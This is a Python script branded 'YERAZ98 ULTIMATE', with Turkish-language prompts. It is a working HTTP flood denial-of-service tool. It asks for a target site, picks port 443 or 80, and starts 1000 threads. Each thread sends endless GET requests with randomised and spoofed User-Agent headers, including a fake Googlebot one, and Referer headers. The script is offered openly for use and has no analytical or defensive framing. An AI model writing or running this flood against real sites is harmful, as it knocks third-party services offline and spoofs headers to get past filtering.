import socket, threading, time, random, ssl
ua_list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64)','Mozilla/5.0 (iPhone; CPU iPhone OS 17_0)','Mozilla/5.0 (Linux; Android 14)','Mozilla/5.0 (compatible; Googlebot/2.1)']
ref_list = ['https://www.google.com/', 'https://www.facebook.com/', 'https://t.co/']

def attack(h, p, is_ssl):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            if is_ssl:
                context = ssl.create_default_context()
                s = context.wrap_socket(s, server_hostname=h)
            s.connect((h, p))
            msg = f'GET / HTTP/1.1\r\nHost: {h}\r\nUser-Agent: {random.choice(ua_list)}\r\nReferer: {random.choice(ref_list)}\r\nConnection: keep-alive\r\n\r\n'.encode()
            s.send(msg); s.close()
        except: time.sleep(0.1)

print("\n [!] YERAZ98 ULTIMATE - FULL ANONIM & SMART PORT")
target = input("[?] Hedef Sayt: ").replace("https://","").replace("http://","").split("/")[0]

port = 443; is_ssl = True
try:
    test_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    test_s.settimeout(2)
    if test_s.connect_ex((target, 443)) != 0:
        port = 80; is_ssl = False
    test_s.close()
except: port = 80; is_ssl = False

print(f"[*] Tesbit: Port {port} | SSL {is_ssl}")
print(f"[X] {target} hedefine 1000 thread ile test bashladi...")

for i in range(1000):
    threading.Thread(target=attack, args=(target, port, is_ssl)).start()
